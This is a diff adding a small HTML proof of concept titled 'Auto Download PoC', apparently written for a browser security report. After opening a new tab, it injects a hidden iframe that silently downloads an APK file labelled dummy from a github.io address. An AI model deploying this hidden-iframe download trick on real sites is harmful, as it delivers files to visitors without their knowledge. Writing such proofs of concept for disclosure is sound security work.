@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Auto Download PoC</title>
+</head>
+<body>
+
+<button onclick="poc()">Start PoC</button>
+
+<script>
+function poc() {
+    // Membuka tab baru (user gesture)
+    const win = window.open("https://bing.com", "_blank");
+
+    // Delay sedikit supaya menyerupai abuse nyata
+    setTimeout(() => {
+        let iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = "https://ecdnts-del.github.io/test-apk/dummy.apk";
+        document.body.appendChild(iframe);
+    }, 1000);
+}
+</script>
+
+</body>
+</html>
